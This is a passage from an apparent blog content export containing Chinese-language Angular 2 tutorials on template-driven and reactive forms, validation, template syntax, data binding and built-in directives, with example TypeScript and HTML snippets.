&#125;&#125;&lt;/option&gt;&lt;/select&gt;&lt;!-- 单选框被选中后返回基本对象类型 --&gt;&lt;select name=\"interestObj\" [(ngModel)]=\"curContact.interestObj\"&gt; &lt;option *ngFor=\"let interest of interests\" [ngValue]=\"interest\"&gt;&#123;&#123; interest.display &#125;&#125;&lt;/option&gt;&lt;/select&gt; 使用[value]来绑定下拉选项的value属性值，当选中后“阅读”后，curContact.interestValue的值将变成reading。而使用[ngValue]，curContact.interestObj的值将变成{value: &#39;reading&#39;, display: &#39;阅读&#39;} 多选下拉框多选下拉框控件（Multiple Select）实现下拉选择多个选项的功能，多选下拉框的用法和单选下拉框类似，不同的是多选下拉框返回的数据是一个由所有被选项数据组成的数组。 以下实现一个多选下拉框，返回一个成员为字符串的数组。123&lt;select multiple name=\"interestMul\" [(ngModel)]=\"curContact.interestMul\"&gt; &lt;option *ngFor=\"let interest of interests\" [value]=\"interest.value\"&gt;&#123;&#123; interest.display &#125;&#125;&lt;/option&gt;&lt;/select&gt; 使用[value]绑定下拉选项，选中“旅游”和“阅读”两项，则curContact.interestMul的值将变成[&#39;reading&#39;,&#39;traveling&#39;]。若使用[ngValue]绑定，则返回的数组对象为：[ {value: &#39;reading&#39;, display: &#39;阅读&#39;},{value: &#39;traveling&#39;, display: &#39;旅游&#39;},] 模板局部变量模板局部变量（Template Reference Variables，简称局部变量），是模板中对DOM元素或指令（包括组件）的引用，可以使用在当前元素、兄弟元素或任何子元素中。 DOM元素局部变量若在标签元素中定义DOM元素局部变量，只需在其局部变量名前加上#符号,或用ref-前缀。123456&lt;li&gt; &lt;label for=\"name\"&gt;姓名：&lt;/label&gt; &lt;input type=\"text\" #contactName name=\"contactName\" id=\"contactName\" /&gt; &lt;input type=\"number\" ref-telNum name=\"telNum\" id=\"telNum\" /&gt; &lt;p&gt;&#123;&#123; contactName.value &#125;&#125; -- &#123;&#123; telNum.value &#125;&#125;&lt;/p&gt;&lt;/li&gt; Angular会自动把局部变量设置为对当前DOM元素对象的引用，如上的局部变量contactName引用的就是document.getElementById(&quot;contactName&quot;)对象,在模板中定义局部变量后，可以直接在模板的其他元素中使用该元素的DOM属性，如contactName.value和telNum.value。 表单指令局部变量表单指令也可以定义局部变量，其引用方式与DOM元素局部变量的引用方式不同，表单指令的局部变量在定义时需手动初始化为特定指令的代表值，最终解析后会被赋值为表单指令实例对象的引用。 NgForm表单局部变量在表单中定义局部变量contactForm，将contactForm变量初始化为ngForm，并在表单控件加入ngModel及contactName属性：12345678910111213&lt;form #contactForm=\"ngForm\"&gt; &lt;ul&gt; &lt;li&gt; &lt;label for=\"contactName\"&gt;姓名：&lt;/label&gt; &lt;input type=\"text\" name=\"contactName\" [(ngModel)]=\"curContact.name\"/&gt; &lt;/li&gt; &lt;li&gt; &lt;label for=\"telNum\"&gt;电话：&lt;/label&gt; &lt;input type=\"text\" name=\"telNum\" [(ngModel)]=\"curContact.telNum\"/&gt; &lt;/li&gt; &lt;!-- ... --&gt; &lt;/ul&gt;&lt;/form&gt; 局部变量contactForm为NgForm指令实例对象的引用，可以在模版读取NgForm实例对象的属性值，如追踪表单的valid属性状态，当被包含的所有控件都有效时，contactForm.valid的值为true，否则为false，在控件中添加ngModel和name属性后，若向姓名控件输入“张三”，电话控件输入“12345678”，则contactForm.value的值为：1234&#123; name: '张三', telName: '12345678'&#125; contactForm对象的value属性是一个简单的JSON对象，该对象的键是对应控件元素的name属性值，而其值对应控件元素的value值。 NgModel控件局部变量一个文本控件，将[(ngModel)]初始化为联系人姓名，并添加控件局部变量name：12&lt;input type=\"text\" name=\"contactName\" [(ngModel)]=\"curContact.name\" #contactName=\"ngModel\" /&gt;&lt;p&gt;&#123;&#123; contactName.valid &#125;&#125;&lt;/p&gt; 局部变量contactName是对NgModel指令实例对象的引用，可以在模板中读取NgModel实例兑现的属性值，如通过contactName.valid可以追踪控件状态、表单校验不通过时的提示错误信息等。 Angular提供NgForm表单局部变量和NgModel控件局部变量，在模板中为追踪表单状态及表单的数据校验提供了便利。 表单状态表单NgForm和NgModel指令都可以用于追踪表单状态来实现数据校验，表单NgForm和NgModel指令都有5个表示状态的属性，属性值都是布尔类型，并都可通过对应的局部变量获取，NgForm追踪的是整个表单控件的状态，NgModel追踪的是其所在表单控件的状态，表单状态的属性语义如下表： 状态 true/false valid 表单值是否有效 pristine 表单值是否未改变 dirty 表单值是否已改变 touched 表单是否已被访问过 untouched 表单是否未被访问过 用户操作会改变表单的属性状态，所以可以检查当前的属性状态值来赋予表单特定的样式或加入特定的处理逻辑。 NgModelGroup指令NgModelGroup指令是Angular提供的另一个特色指令，可以对表单输入内容进行分组，方便在语义上区分不同类型额输入，例如“姓名”可以细分为“姓”和“名”，“地址”可以细分为“城市”、“街道”、“区”、“街”等，通过NgModelGroup可以将其进行分组收集：1234567891011121314151617&lt;form #contactForm=\"ngForm\"&gt; &lt;fieldset ngModelGroup=\"nameGroup\" #nameGroup=\"ngModelGroup\"&gt; &lt;label for=\"firstname\"&gt;姓：&lt;/label&gt; &lt;input type=\"text\" name=\"firstname\" [(ngModel)]=\"curContact.firstname\"/&gt; &lt;label for=\"lastname\"&gt;名：&lt;/label&gt; &lt;input type=\"text\" name=\"lastname\" [(ngModel)]=\"curContact.lastname\"/&gt; &lt;/fieldset&gt; &lt;fieldset ngModelGroup=\"addressGroup\" #addressGroup=\"ngModelGroup\"&gt; &lt;label for=\"street\"&gt;街：&lt;/label&gt; &lt;input type=\"text\" name=\"street\" [(ngModel)]=\"curContact.street\"/&gt; &lt;label for=\"zip\"&gt;区：&lt;/label&gt; &lt;input type=\"text\" name=\"zip\" [(ngModel)]=\"curContact.zip\"/&gt; &lt;label for=\"city\"&gt;城市：&lt;/label&gt; &lt;input type=\"text\" name=\"city\" [(ngModel)]=\"curContact.city\"/&gt; &lt;/fieldset&gt; &lt;!-- ... --&gt;&lt;/form&gt; 通过ngModelGroup指令，此时contactForm.value的值为:1234567891011&#123; nameGroup: &#123; firstname: '', lastname: '' &#125;, addressGroup: &#123; street: '', zip: '', city: '' &#125;,&#125; 除此外，NgModelGroup实例对象的valid属性可以单独校验其所在分组控件的输入是否有效，例如姓名分组中，只有curContact.firstname和curContact.lastname都有效时，局部变量nameGroup.valid才为true。 ngSubmit事件ngSubmit事件可以响应表单里类型为submit的按钮操作，并负责控制表单的提交流程，当按钮被单击后，会触发表单的ngSubmit事件。 示例组件模板代码如下：12345678&lt;form #contactForm=\"ngForm\" (ngSubmit)=\"doSubmit(contactForm.value)\"&gt; &lt;!-- ... --&gt; &lt;li class=\"form-group\"&gt; &lt;button type=\"submit\" class=\"btn btn-default\" [disabled]=\"!contactForm.valid\"&gt;添加&lt;/button&gt; &lt;button type=\"reset\" class=\"btn btn-default\"&gt;重置&lt;/button&gt; &lt;/li&gt;&lt;/form&gt; 提交按钮逻辑如下：12345export class FormComponent&#123; doSubmit(formValue: any)&#123; // ... &#125;&#125; 上例中，在form上绑定了ngSubmit事件，ngSubmit事件的类型是EventEmitter，当提交按钮被单击后，首先执行表单原生的onSubmit事件，接着执行FormComponent组件中定义的doSubmit()方法，该方法接收contactForm.value的值作为参数传入，并对传入数据处理。 自定义表单样式NgModel指令不仅仅能追踪表单控件的状态，还能根据表单控件的状态使用对应的CSS状态类来更新表单控件的类名，表单控件包括6个CSS状态类： 状态 为true时的CSS类 为false时的CSS类 控件是否已经被访问过 ng-touched ng-untouched 控件值是否已经变化 ng-dirty ng-prinstine 控件值是否有效 ng-valid ng-invalid 表单控件的CSS类名会根据表单控件状态变化而变化，在实际场景里，可以自定义对应CSS类的样式。 表单校验表单校验（Validation）是用来检查表单的输入值是否满足设定的规则，若不满足，则将相关状态立即反馈给用户，Angular封装了相关表单校验规则，提供了灵活的接口，以便能够高效的完成相关表单校验。 Angular表单内置校验（Build-in Validation） required : 判断表单控件值是否为空 minlength ： 判断表单控件值的最小长度 manlenght : 判断表单控件值的最大长度 pattern : 判断表单控件值的匹配规则 使用Angular内置校验与使用普通HTML校验一致，直接在表单控件中添加对应的校验属性即可：1&lt;input type=\"text\" minlength=3 maxlength=10 [(ngModel)]=\"curContact.name\" name=\"contactName\" required /&gt; HTML原生支持的校验样式不可控，可以在form标签中添加novalidate属性来屏蔽原生校验。 表单自定义校验Angular提供的表单内置校验基本能满足大部分校验需求，但若需要实现复杂的表单校验功能，可以使用Angular提供的表单自定义校验（Custom Validator）。 创建一个自定义校验规则：比如用户名需要是邮箱或手机号等：12345678910111213// validate-username.tsimport &#123; FormControl &#125; from '@angular/froms';const EMAIL_REGEXP = new RegExp('[a-z0-9]+@[a-z0-9]+.com');const TEL_REGEXP = new RegExp('1[0-9]&#123;10&#125;');export function validateUserName(c: FormControl)&#123; return (EMAIL_REGEXP.test(c.value) || TEL_REGEXP.test(c.value) ? null : &#123; userName: &#123; valid: false, errorMsg: '用户名必须是邮箱或手机号' &#125; &#125;);&#125; 在模型驱动方式构建的表单中使用自定义校验，需要在表单组件所在的模块代码中导入ReactiveFormsModule,并在模块的@NgModule元数据imports数组中加入ReactiveFormsModule。1234567891011// ...import &#123; ReactiveModule &#125; from '@angular/forms';import &#123; FormComponent &#125; from './form.component';import &#123; AppComponent &#125; from './app.component';@NgModule(&#123; imports: [BrowserModule, ReactiveFormsModule], declarations: [AppComponent, FormComponent], bootstrap: [AppComponent]&#125;)export class AppModule&#123;&#125; 导入ReactiveFormsModule后，可在表单组件FormComponent中使用模型驱动方式构建表单，构建表单组件及使用自定义校验的代码如下：123456789101112131415161718import &#123; Component &#125; from '@angular/core';import &#123; FormGroup, FromControl &#125; from '@angular/forms';import &#123; validateUserName &#125; from './validate-username';@Component(&#123; selector: 'add-contact', template: ` &lt;form [formGroup]=\"customForm\"&gt; &lt;label&gt; 姓名：&lt;/label&gt; &lt;input type=\"text\" formControlName=\"customName\" /&gt; &lt;/form&gt; `&#125;)export class FormComponent&#123; customForm = new FormGroup(&#123; customName: new FormControl('', validateUserName) &#125;);&#125; 上述代码中，定义了customForm(FormGroup表单实例对象)和customName(FormControl控件实例对象)，在构建FormControl实例对象customName时传入的参数中，第一个参数为控件返回值的初始值，第二个参数为该控件的校验配置方法。 此外，校验配置可以使用Validators的内置校验，如Validators.required()、Validators.minLength()等，与直接在表单控件元素中添加required、minlength属性效果一致。使用Validators内置校验，需要先从@angular/forms导入Validators：123456import &#123; Validators &#125; from '@angular/forms';// ...customForm = new FormGroup(&#123; customName: new FormControl('', Validators.minLength(4))&#125;);// ... 若需要在一个表单中添加多个校验器，可以在校验配置参数中使用数组、数组元素为对应的校验方法。123customForm = new FormGroup(&#123; customName: new FormControl('', [Validators.minLength(4), validateUserName])&#125;);","categories":[{"name":"Angular","slug":"Angular","permalink":"https://github.com/xmoyKING/categories/Angular/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"typescript","slug":"typescript","permalink":"https://github.com/xmoyKING/tags/typescript/"},{"name":"angular","slug":"angular","permalink":"https://github.com/xmoyKING/tags/angular/"}]},{"title":"Angular2入门-模板-1","slug":"angular4","date":"2017-10-07T01:23:32.000Z","updated":"2017-12-06T14:50:08.821Z","comments":true,"path":"2017/10/07/angular4/","link":"","permalink":"https://github.com/xmoyKING/2017/10/07/angular4/","excerpt":"","text":"模板是一种自定义的标准化页面，通过模板和模板中的数据结合，可以生成各种各样的网页。 在Angular中，模板的默认语言是HTML，几乎所有的HTML语法在模板中都适用，script标签除外，主要是为了防止XSS，同时一些HTML元素在模板中并不起作用，如html、body、base等标签。Angular可以通过组件和指令对模板的HTML元素进行扩展，这些扩展将以新的元素或属性的形式出现。 模板语法概览初步认识模板语法。 具体查看Angular 2 模板语法 示例 名称 说明 语法 &lt;p&gt;｛｛detail.telNum ｝｝ &lt;/p&gt; 插值 绑定属性变量的值到模板中 ｛｛模板表达式｝｝ &lt;div [title]=&quot;name&quot;&gt;hello world &lt;/div&gt; DOM元素属性绑定 将模板表达式name的值绑定带元素div的属性title上 [DOM元素属性]=&quot;模板表达式&quot;或bind-DOM元素属性=&quot;模板表达式&quot; &lt;td [attr.colspan]=&quot;｛｛ 1 + 2 ｝｝&quot;&gt;合并单元格&lt;/div&gt; HTML标签特性绑定 将模板表达式的返回值绑定到元素td标签特性colspan上 [attr.HTML标签特性]=&quot;模板表达式&quot; &lt;div [class.isblue]=&quot;isBlue()&quot;&gt;单击&lt;/div&gt; Class类绑定 当isBlue()函数值为true时为div添加类名为isBlue的样式 [class.css类名]=&quot;模板表达式&quot; &lt;button [style.color]=&quot;isRed?&#39;red&#39;:&#39;green&#39;&quot;&gt;红&lt;/div&gt; Style样式绑定 当表达式isRed的值为true时设置button的文字颜色为红色，否则为绿色 [style.css样式属性名]=&quot;模板表达式&quot; &lt;a class=&quot;edit&quot; (click)=&quot;editContact()&quot;&gt;编辑&lt;/a&gt; 事件绑定 单击元素时会触发click事件，需要时也可以传递$event对象，如(click)=&quot;editContact($event)&quot; (事件)=&quot;模板语法&quot;或on-事件=&quot;模板语句&quot; &lt;div [(title)]=&quot;name&quot;&gt;&lt;/div&gt; 双向绑定 组件和模板间双向数据绑定，等价于&lt;div [title]=&quot;name&quot; (titleChange)=&quot;name=$event&quot;&gt;&lt;/div&gt; [(绑定目标)]=&quot;模板表达式&quot;或bindon-绑定目标=&quot;模板表达式&quot; &lt;input type=&quot;text&quot; ##name name=&quot;name&quot; id=&quot;name&quot; /&gt;&lt;p&gt;｛｛name.value｝｝&lt;/p&gt; 模板局部变量 在当前模板中创建一个对id值为name的input元素的引用变量name，相当于document.getElementById(&#39;name&#39;) ##变量名或ref-变量名 &lt;p&gt;张三的生日是｛｛birthdat 管道操作符 date ｝｝&lt;/p&gt; 管道操作符 元素数据birthday经管道转换后输出期望数据并显示在模板中 输入数据 管道操作符 管道名:管道参数 &lt;p&gt;｛｛detail?.telNum ｝｝&lt;/p&gt; 模板表达式操作符 模板表达式操作符表明detail.telNum属性不是必须存在的，若其值为undefined，那么后面的表达式将被忽略，不会引发异常 ?. &lt;p *myUnless=&quot;boolValue&quot;&gt;myUnless is false now.&lt;/p&gt; 星号前缀 使用星号前缀可以简化对结构指令的使用，Angular会将带有星号的指令引用替换成带有&lt;template&gt;标签的代码，等价于&lt;template [myUnless]=&quot;boolValue&quot;&gt;&lt;p&gt;myUnless is false now.&lt;/p&gt;&lt;/template&gt; *指令 数据绑定Angular提供了多种数据绑定的方式，根据数据流动的方向分为3种： 数据流向 示例 绑定类型 单向：数据源到视图目标（属性绑定） &lt;p&gt;｛｛detail.telNum｝｝&lt;/p&gt;, &lt;div [title]=&quot;name&quot;&gt;hello world&lt;/div&gt;, &lt;div [style.color]=&quot;color&quot;&gt;hello world&lt;/div&gt; 插值DOM元素属性绑定HTML标签特性绑定 单向：从视图目标到数据源（事件绑定） (click)=&quot;editContact()&quot;,on-click=&quot;editContact()&quot; 事件绑定 双向 &lt;div [(title)]=&quot;name&quot;&gt;&lt;/div&gt;, &lt;div bindon-title=&quot;name&quot;&gt;&lt;/div&gt; 双向绑定 上表中，除了插值外，在“=”的左侧都有一个目标名称，它可以被[],()包裹，或者加上一个前缀（bind-,on-,bindon-）,这被称为绑定目标，而在“=”的右侧或者插值符号中的部分被称为绑定源。 有一对非常重要的概念，即DOM对象属性（Property）与HTML标签特性（Attribute），在英语中Property和Attribute都可以翻译为”属性”，名字虽然相同，但在模板中意义却不同。理解它们的不同是理解Angular数据绑定的关键。 定义方式 说明 DOM对象属性（Property） 以DOM元素为对象，其附加的内容，是在文档对象模型里定义的，如childNodes，firstChild等 HTML标签特性（Attribute） 是DOM节点自带的属性，是在HTML里定义的，即只要是HTML标签中出现的属性（HTML代码）都是Attribute，例如HTML中常用的colspan，align等 大多数情况下，DOM对象属性与HTML标签特性不是一一对应的，但有少量属性既是DOM对象属性又是HTML标签特性，如id、title、class（CSS类）等。通常HTML标签特性代表着初始值，初始化后就不再发生改变，而DOM对象属性代表当前值，默认为初始值，它它会随着属性值而变化。数据绑定是借助元素和指令的DOM对象属性和事件来运作的，而不是HTML标签特性。在Angular中，HTML标签特性唯一的作用就是用来进行元素和指令状态的初始化。 模板表达式模板表达式类似JS原生表达式，但不可以使用一些会引起副作用的JS表达式： 带有new运算符的表达式 赋值表达式（=，+=，-=等） 带有;或,的链式表达式 带有自增和自减操作（++和–）的表达式 不支持位运算符 | 和 &amp; 部分模板表达式操作符被赋予了新的含义，如管道操作符，和安全导航操作符?. 模板表达式上下文通常就是它所在组件的实例，也可以包括组件之外的对象，如模板局部变量，但需注意，模板表达式不能引用任何全局命名空间中的成员，如window、document，console，Math等。 模板表达式书写原则： 避免视图变化的副作用一个模板表达式只能改变目标属性的值，不应改变应用的任何状态，Angular的单向数据流模式正是基于这条原则来的，在单独的渲染过程中，视图应该是可以预测到的，不必担心在读取组件值时会不小心改变其他的一些展示值 高效执行Angular执行表达式的频率很高，触发任何一次键盘或鼠标事件都可能执行，当计算成本很大时，可以考虑缓存那些计算得出的值。 使用简单的语句避免编写一些比较复杂的模板表达式 幂等性优先表达式应该遵循幂等性优先原则，幂等的表达式总是返回完全一致的东西，这样就没有副作用，并能提升Angular变化监测的性能，但表达式的返回值还是会随着它所依赖的值变化而变化。 属性绑定属性绑定是一种单向的数据绑定，数据从组件类流向模板，当要把一个视图元素的属性设置为模板表达式时，就需要用到属性绑定。 一般的，属性绑定不能用来从目标元素获取值，或者调用目标元素上的方法，即目标元素的值只能被设置，不能被读取，但可以使用@ViewChild和@ContentChild来读取目标元素的属性或调用它的方法。 在属性绑定中，“=”左侧中括号的作用是让Angular执行“=”右侧的模板表达式，并将结果赋值给该目标属性，若没有中括号，Angular会把右侧的模板表达式当做一个普通的字符串常量而不会计算该表达式，所以若赋值给目标属性的值是一个固定的字符串，中括号推荐省略。 Angular推荐使用DOM元素属性绑定，但当元素没有对应的属性可绑定的时候，则可以使用HTML标签特性绑定来设置值，例如table标签中的colspan或rowspan等，没有相对的DOM属性可供绑定，若直接用模板表达式赋值将会出现模板解析错误：1&lt;td colspan\"&#123;&#123; 1 + 2 &#125;&#125;\"&gt;合并单元格&lt;/td&gt; 因为colspan在td元素中并不是DOM元素属性，而是HTML标签特性，插值和属性绑定只能设置DOM元素属性，不能设置HTML标签特性。HTML标签特性绑定在语法上类似于属性绑定，但中括号中的部分不是一个元素的属性名，而是由attr.的前缀和HTML标签特性名称组成的形式，然后通过一个模板表达式来设置HTML标签特性的值：1&lt;td [attr.colspan]=\"&#123;&#123; 1 + 2 &#125;&#125;\"&gt;合并单元格&lt;/td&gt; CSS类既属于HTML标签特性，又属于DOM对象属性，所以可以使用以上两种方式来完成属性绑定:12345&lt;!-- 标准HTML样式类设置 --&gt;&lt;div class=\"font14\"&gt;14号字体&lt;/div&gt;&lt;!-- 通过绑定重设或覆盖类 --&gt;&lt;div class=\"red font14\" [class]=\"changeGreen\"&gt;14号绿字体&lt;/div&gt; 当使用DOM对象属性绑定给[class]绑定值时，changeGreen对象会重写这个div元素的全部class。另外Angular也提供了类似[class.class-name]的语法来完成属性绑定，当赋值为true时，将class-name这个类添加到该绑定的标签上，否则将移除这个类：1234567&lt;div [class.color-blue]=\"isBlue()\"&gt; 若isBlue返回true，则变为蓝色&lt;/div&gt;&lt;div class=\"footer\" [class.footer]=\"showFooter\"&gt; 若showFooter为false，则footer这个CSS类将被移除&lt;/div&gt; HTML标签内联样式可以通过Style样式绑定的方式来设置，也可以带上样式单位,支持驼峰式命名和连字符式命名123&lt;div [style.font-size.px]=\"isLarge ? 18 : 13\"&gt; 若isLarge返回true，则变为18px&lt;/div&gt; 属性绑定和插值本质上没有区别，在渲染视图之前，Angular会将插值表达式转换成属性绑定的形式，插值只是属性绑定的一个语法糖，推荐插值表达式。同时渲染之前，Angular会对内容进行安全处理，不允许带有script标签的HTML展示到浏览器中。 事件绑定事件绑定也是一种单向数据绑定形式，数据从模板流向组件类。模板语法的上下文可以包含组件之外的对象，如模板局部变量和事件绑定语句中的$event。 目标事件可以是常见的事件（如click），也可以是自定义指令的事件。Angular在解析目标事件时，会优先判断是否匹配已知指令的事件，若事件名既不是某个已知指令的事件，也不是元素事件，那么会报“未知指令”的错误。 $event事件对象可以获取该事件的相关信息，目标事件的类型决定了事件对象的形态，目标事件是DOM元素事件则$event将是一个包含target和target.value属性的DOM事件对象。1&lt;input [value]=\"currentUser.firstName\" (input)=\"currentUser.firstName=$event.target.value\" /&gt; 组件要触发自定义事件可以借助于EventEmitter，在组件中可以创建一个EventEmitter实例对象，并将其输出属性的形式暴露出来，父组件通过绑定这个输出属性来自定义一个事件，在组件中调用EventEmitter.emit(payload)来触发这个自定义事件，其中payload可以传入任何值，父组件绑定的事件可以通过$event对象来访问payload的数据。 以通讯录为例，联系人列表页面，单击对应联系人区域，可以看到联系人的详细信息：1234567891011121314151617// item.component.tsimport &#123; Component, Input, Output, EventEmitter &#125; from '@angular/core';import &#123; Router &#125; from '@angular/router';@Component(&#123; selector: 'list-item', templateUrl: 'app/list/item.component.html', styleUrls: ['app/list/item.component.css']&#125;)export class ListItemComponent &#123; @Input() contact: any = &#123;&#125;; @Output() routerNavigate = new EventEmitter&lt;number&gt;(); goDetail(num: number) &#123; this.routerNavigate.emit(num); &#125;&#125; 1234&lt;!-- item.component.html --&gt;&lt;a (click)=\"goDetail(contact.id)\"&gt; &lt;!-- ... --&gt;&lt;/a&gt; 组件ListItemComponent定义了一个EventEmitter实例routerNavigate，点击a标签组件调用goDetail方法，其再去执行EventEmitter.emit()方法，传递一个数字，并跳转到对应的联系人详情页面，另外，作为宿主的父组件绑定了ListItemComponent的routerNavigate事件。123456// list.component.html&lt;ul class=\"list\"&gt; &lt;li *ngFor=\"let contact of contacts\"&gt; &lt;list-item [contact]=\"contact\" (routerNavigate)=\"routerNavigate($event)\"&gt;&lt;/list-item&gt; &lt;/li&gt;&lt;/ul&gt; 当routerNavigate事件触发时，Angular就会调用父组建的routerNavigate方法，在$event中传入对应的联系人id。执行routerNavigate()方法使得页面内容更新，显示联系人详细信息。 双向数据绑定双向数据绑定可以利用属性绑定和事件绑定结合的形式来处理：1&lt;input [value]=\"currentUser.phone\" (input)=\"currentUser.phone=$event.target.value\" /&gt; Angular提供NgModel指令可以更方便的进行双向绑定：1234&lt;input [ngModel]=\"currentUser.phone\" (ngModelChange)=\"currentUser.phone=$event\"/&gt; 通过ngModel输入属性和ngModelChange输出属性隐藏了一些繁琐的细节，但更简洁的是通过[()]语法实现,[]实现了数据流从组件类到模板，()实现了数据流从模板到组件类，两者结合的[()]就可以简单实现实现双向绑定了。1234&lt;input [(ngModel)]=\"currentUser.phone\" /&gt;&lt;!-- 等价于 --&gt;&lt;input bindon-ngModel=\"currentUser.phone\" /&gt; 但[()]语法只能简单的设置一个数据绑定数据，若想完成更多任务，就得采用分离的形式来实现，例如在联系人手机号码前加上区号：1234&lt;input [ngModel]=\"currentUser.phone\" (ngModelChange)=\"addCodeForPhone($event)\"/&gt; 双向绑定的原理[(ngModel)]可以拆分为ngModel和ngModelChange两部分，其中，ngModel是作为NgModel指令的输入属性用来设置元素的值，ngModelChange作为NgModel指令的输出属性用来监听元素值是否变化。 ngModelChange属性并不会生成DOM事件，实际上它是一个EvenEmiiter类型对象，[(ngModel)]的具体实现为：1234567891011@Directive(&#123; selector: \"[ngModel]\", host: &#123; \"[value]\": \"ngModel\", \"(input)\": \"ngModelChange.next($event.target.value)\" &#125;&#125;)class NgModelDirective&#123; @Input() ngModel: ang; @Output() ngModelChange: EventEmitter = new EventEmitter();&#125; 上述代码中设计指令相关知识，host属性用来描述和指令元素相关的输入输出属性变化，即当[ngModel]的ngModelChange事件发生时就会触发input事件，当[ngModel]的ngModel值变化时就会更新value属性。 Angular提供了一种双向数据绑定的语法，即[(x)],也就是说当Angular解析一个[(x)]的绑定目标时，相当于为这个x指令绑定一个名为x的输入属性和一个名为xChange的输出属性,例如：123&lt;span [(x)]=\"e\"&gt;&lt;/span&gt;&lt;!-- 等价于 --&gt;&lt;span [x]=\"e\" (xChange)=\"e=$event\"&gt;&lt;/span&gt; 总的来说，双向数据绑定实际上就是通过输入属性存储数据，同时通过一个与之对应的输出属性(输入属性+Change后缀)监听输入属性的数据变化来触发相应的事件。 以创建一个支持双向绑定的组件为例，绑定一个number的输入输出属性，同时在组件中需要定义一个@Output输出属性来匹配@Input输入属性：1234567891011121314151617181920// amount.component.tsimport &#123; Component, Input, Output, EventEmitter &#125; from '@angular/core';@Component(&#123; selector: 'amount', template: ` &lt;span&gt; 子组件当前值：&#123;&#123;value&#125;&#125; - &lt;button (click)=\"increment()\"&gt;增加&lt;/button&gt; &lt;/span&gt; `&#125;)export class AmountComponent &#123; @Input() value: number = 0; @Output() valueChange: EventEmitter&lt;number&gt; = new EventEmitter&lt;number&gt;(); increment()&#123; this.value++; this.valueChange.emit(this.value); &#125;&#125; 123456789101112131415161718192021222324252627// app.component.tsimport &#123; Component, Input &#125; from '@angular/core';import &#123; AmountComponent &#125; from './amount.component';@Component(&#123; selector: 'app', template: ` &lt;div&gt; &lt;div&gt; &lt;span&gt;Number 1: &lt;/span&gt; &lt;amount [(value)]=\"number1\"&gt;&lt;/amount&gt; &lt;/div&gt; &lt;div&gt; &lt;span&gt;Number 2: &lt;/span&gt; &lt;amount [value]=\"number2\" (valueChange)=\"number2=$event\"&gt;&lt;/amount&gt; &lt;/div&gt; &lt;ul&gt; &lt;li&gt;Number 1: 父组件当前值：&#123;&#123; number1 &#125;&#125;&lt;/li&gt; &lt;li&gt;Number 2: 父组件当前值：&#123;&#123; number2 &#125;&#125;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; `&#125;)export class Parent &#123; number1: number = 0; number2: number = 1;&#125; 输入、输出属性有时，输入、输出属性名的语义不是很明确，可能描述不清这个属性的作用或者功能，因此，给输入、输出属性名定义一个有语义的别名是非常有必要的，定义别名有2种方式： 通过@Input和@Output装饰其为属性指定别名，语法形如：@Output(别名) 事件属性名=&quot;...&quot;， 例如给一个自定义事件定义了一个别名goto，@Output(&#39;goto&#39;) clicks= new EventEmitter&lt;number&gt;(); 采用组件（指令）元数据的inputs或outputs数组可以为属性指定别名，语法形如：outputs: [&#39;组件属性名: 别名&#39;] 内置指令在Angular中，指令作用在特定的DOM元素上，可以扩展这个元素的功能，为元素增加新的行为，Angular框架本身自带一些指令，如NgClass、NgStyle、NgIf、NgFor、NgSwitch等。 NgClass在属性绑定中，CSS类绑定的方式能够为标签元素添加或移除单个类，在实际开发中，通过动态添加或移除CSS类的方式，可以控制元素展示，在Angular中，通过NgClass指令，可以同时添加或移除多个类。NgClass绑定一个对象，其中数据为CSS类名:value的键值对，value是一个布尔类型的数据值，当value为true时则添加对应的类名到模板元素上，反之则移除。 在组件中设置一个管理类状态的对象，用来控制在模板元素中是否添加red、font14、title类。12345678910// ...setClasses()&#123; let classes = &#123; red: this.red, // true font14: !this.font14, // false title: this.isTitle, // true &#125;; return classes;&#125;// ... 通过添加一个ngClass属性绑定，调用组件setClasses()方法来设置该元素的类样式：1&lt;div [ngClass]=\"setClasses()\"&gt;红色标题&lt;/div&gt; NgStyle在属性绑定中，Style样式绑定的方式能够给模板元素设置单一的样式，而采用NgStyle指令可以为模板元素设置多个内联样式，与NgClass类似，NgStyle绑定一个形如CSS属性名:value的对象，其中value为具体的CSS样式。 在组件中设置一些内联的CSS样式，用来在模板元素中设置color，font-size，font-weight：12345678910// ...setStyles()&#123; let styles = &#123; 'color': this.red ? 'red' : 'blue', // red 'font-size': !this.font14 ? '14px' : '16px', // 16px 'font-weight': this.isSpecial ? 'bold' : 'normal', // bold &#125;; return styles;&#125;// ... 使用：1&lt;div [ngStyle]=\"setStyles()\"&gt;红色16px加粗&lt;/div&gt; NgIfNgIf指令绑定一个布尔类型的表达式，当表达式返回true时，可以在DOM树节点上添加一个元素及其子元素，反之将被移除：1&lt;h3 *ngIf=\"collect.length === 0\" class=\"no-collection\"&gt;未收藏&lt;/h3&gt; 写法*ngIf是一种语法糖，与NgSwitchCase、NgSwitchDefault、NgFor类似。 NgIf与类、样式绑定的方式区别在于：样式、类绑定的方式也可以设置模板元素的显示与隐藏，如通过class.hidden属性的绑定方式可以控制是否显示该模板元素:1&lt;h3 [class.hidden]=\"collect.length === 0\" class=\"no-collection\"&gt;未收藏&lt;/h3&gt; 但与NgIf不同，它们仅仅只是设置了元素是否显示，而该元素还保留在DOM树的节点上，类似display:none,而NgIf则是当表达式返回值为false时，元素会从DOM树上移除。 NgSwitchNgSwitch指令需要结合NgSwitchCase和NgSwitchDefault指令来使用，根据NgSwitch绑定的模板表达式的返回值来决定添加哪个模板元素到DOM节点上，并移除其他备选模板元素： ngSwitch ： 绑定到一个返回控制条件的值的表达式 ngSwitchCase ：绑定到一个返回匹配条件的值的表达式 ngSwitchDefault ：用于标记默认元素的属性注：ngSwitch前不加*、而ngSwitchCase和ngSwitchDefault前加 根据组件的contactName属性来确定展示对应的中文名:12345&lt;span [ngSwitch]=\"contactName\"&gt; &lt;span *ngSwitchCase=\"'TimCook'\"&gt;蒂姆 库克&lt;/span&gt; &lt;span *ngSwitchCase=\"'BillGates'\"&gt;比尔盖茨&lt;/span&gt; &lt;span *ngSwitchDefault&gt;无名&lt;/span&gt;&lt;/span&gt; 每个子指令ngSwitchCase根据ngSwitch属性绑定的条件值来进行相关匹配，看是否符号某个子指令的判断条件，若符合则把该元素添加到DOM树节点上，并移除其兄弟元素，若匹配不到所有的条件值则显示子指令ngSwitchDefault对应的模板元素。 NgForNgFor指令可以实现重复执行某些步骤来展示数据，例如用来展示多列的模板列表，这些模板元素结构及布局一致，只是展示具体数据不一样：123&lt;li *ngFor=\"let contact of contacts\"&gt; &lt;list-li [contact]=\"contact\" 